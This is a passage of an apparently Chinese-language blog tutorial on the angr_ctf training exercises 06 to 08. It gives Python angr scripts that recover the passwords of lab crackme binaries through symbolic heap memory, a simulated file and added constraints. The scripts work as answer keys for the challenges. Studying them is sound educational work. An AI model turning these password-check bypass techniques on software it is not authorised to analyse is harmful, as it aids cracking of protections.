keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./06_angr_symbolic_dynamic_memory\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486af</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  password0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  password1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  fake_heap_address0 <span class=\"token operator\">=</span> <span class=\"token number\">0x4444444</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  pointer_to_malloc_memory_address0 <span class=\"token operator\">=</span> <span class=\"token number\">0xa2def74</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>pointer_to_malloc_memory_address0<span class=\"token punctuation\">,</span> fake_heap_address0<span class=\"token punctuation\">,</span> endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  fake_heap_address1 <span class=\"token operator\">=</span> <span class=\"token number\">0x4444454</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  pointer_to_malloc_memory_address1 <span class=\"token operator\">=</span> <span class=\"token number\">0xa2def7c</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>pointer_to_malloc_memory_address1<span class=\"token punctuation\">,</span> fake_heap_address1<span class=\"token punctuation\">,</span> endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>fake_heap_address0<span class=\"token punctuation\">,</span> password0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>fake_heap_address1<span class=\"token punctuation\">,</span> password1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    solution0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password0<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password1<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    solution <span class=\"token operator\">=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span> solution0<span class=\"token punctuation\">,</span> solution1 <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>实际上，(IDA 中) 可以看到在两次调用之后，根据 mov ds:buffer0, eax 和 mov ds:buffer1, eax 得知开辟后的缓冲区被复制到标识为 buffer0 和 buffer1 的两个存储区中</p>\n<p>(这里总的逻辑是这样的，之前是 buffer 指向的是 malloc 分配好的内存地址，string 存在这里。现在是 buffer 指向的是我们伪造的地址，符号位向量存在这里)</p>\n<p>将两个符号变量存储到一个预先分配的 fake_heap_address0 和 fake_heap_address1 地址中，这些地址是未使用的堆内存地址，Angr 使用 initial_state.memory.store 函数将符号变量存储到指定地址中。通过修改指向 malloc 分配的内存地址的指针，指向 fake_heap_address0 和 fake_heap_address1，从而欺骗程序，使其认为输入的密码已经存储在 malloc 分配的内存中。</p>\n<h3 id=\"07_angr_symbolic_file\"><a class=\"markdownIt-Anchor\" href=\"#07_angr_symbolic_file\">#</a> 07_angr_symbolic_file</h3>\n<p>学习如何符号化一个文件里面的内容</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 1. 确定 fread 读取的文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 2. 使用 Angr 模拟一个文件系统，让读取的文件被我们自己的文件替换</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 3. 使用符号值初始化文件，该值将使用 fread 读取</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 4. 求解符号输入以确定密码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./07_angr_symbolic_file\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80488bc</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  filename <span class=\"token operator\">=</span> <span class=\"token string\">'FOQVSBZB.txt'</span>  <span class=\"token comment\"># :string</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  symbolic_file_size_bytes <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  password <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">,</span> symbolic_file_size_bytes <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  password_file <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>storage<span class=\"token punctuation\">.</span>SimFile<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>fs<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> password_file<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>简单来说利用 SimFile 形成符号化的文件的格式：</p>\n<pre><code>simgr_file = angr.storage.SimFile(filename, content=xxxxxx, size=file_size)\n</code></pre>\n<p>该代码使用了 Angr 工具模拟了一个文件系统，以解决密码验证的问题。主要流程如下：</p>\n<ol>\n<li>使用 Angr 加载二进制文件，并指定程序入口地址。</li>\n<li>使用 initial_state.fs.insert 函数向模拟文件系统中添加一个名为’FOQVSBZB.txt’的文件，并使用 claripy.BVS 定义了一个名为 password 的符号变量，表示密码。</li>\n<li>将符号变量 password 存储到模拟文件系统的’FOQVSBZB.txt’文件中，作为文件的内容。</li>\n<li>使用 Angr 的 simgr 对象，对初始状态进行符号执行，通过指定的 find 和 avoid 条件，找到满足条件的状态。</li>\n<li>如果找到满足条件的状态，则从该状态中提取出 password 的解，输出解。</li>\n<li>如果无法找到满足条件的状态，则抛出异常。</li>\n</ol>\n<p>该代码的核心思想是通过符号执行，对程序进行模拟，并在模拟的文件系统中添加一个文件，并将符号变量存储到该文件中。因此，当程序调用 fread 函数从文件中读取密码时，实际上读取的是符号变量，Angr 可以通过符号执行来解决密码验证的问题。</p>\n<h3 id=\"08_angr_constraints\"><a class=\"markdownIt-Anchor\" href=\"#08_angr_constraints\">#</a> 08_angr_constraints</h3>\n<p>学习通过添加约束条件来解决路径爆炸问题</p>\n<h4 id=\"路径爆炸\"><a class=\"markdownIt-Anchor\" href=\"#路径爆炸\">#</a> 路径爆炸</h4>\n<p>通过我们之前的学习体验感觉到 angr 这么强大的应用怎么没有在实际的测试生产中大规模应用，这是因为给符号执行技术在复杂程序的测试案例生成的应用中造成阻碍的两个大问题：一个是约束求解问题，另一个就是路径爆炸问题 (for 中 if)</p>\n<p>所谓符号执行就是把程序中的变量符号化去模拟程序运行，搜集路径约束条件并使用约束求解器对其进行求解后得到结果。</p>\n<p>当一个程序存在循环结构时，即使逻辑十分简单也可能会产生规模十分巨大的执行路径。在符号执行的过程中，每个分支点都会产生两个实例，当程序中存在循环结构展开时，可能会导致程序分支路径数呈指数级增长，即路径爆炸问题。故我们需要提供更多的约束条件控制路径爆炸问题。</p>\n<h4 id=\"约束求解\"><a class=\"markdownIt-Anchor\" href=\"#约束求解\">#</a> 约束求解</h4>\n<p>在 angr 中提供了可以用加入一个约束条件到一个 state 中的方法（state.solver.add），将每一个符号化的布尔值作为一个关于符号变量合法性的断言。之后可以通过使用 state.solver.eval (symbol) 对各个断言进行评测来求出一个合法的符号值（若有多个合法值，返回其中的一个）。简单来说就是通过 .add 对 state 对象添加约束，并使用 .eval 接口求解，得到符号变量的可行解</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./08_angr_constraints\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804863c</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  password <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  password_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a040</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>password_address<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\"># Angr will not be able to reach the point at which the binary prints out</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\"># 'Good Job.'. We cannot use that as the target anymore.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  address_to_check_constraint <span class=\"token operator\">=</span> <span class=\"token number\">0x8048683</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>address_to_check_constraint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    constrained_parameter_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a040</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    constrained_parameter_size_bytes <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    constrained_parameter_bitvector <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      constrained_parameter_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      constrained_parameter_size_bytes</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># We want to constrain the system to find an input that will make</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\"># constrained_parameter_bitvector equal the desired value.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    constrained_parameter_desired_value <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># :string (encoded)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    solution_state<span class=\"token punctuation\">.</span>add_constraints<span class=\"token punctuation\">(</span>constrained_parameter_bitvector <span class=\"token operator\">==</span> constrained_parameter_desired_value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 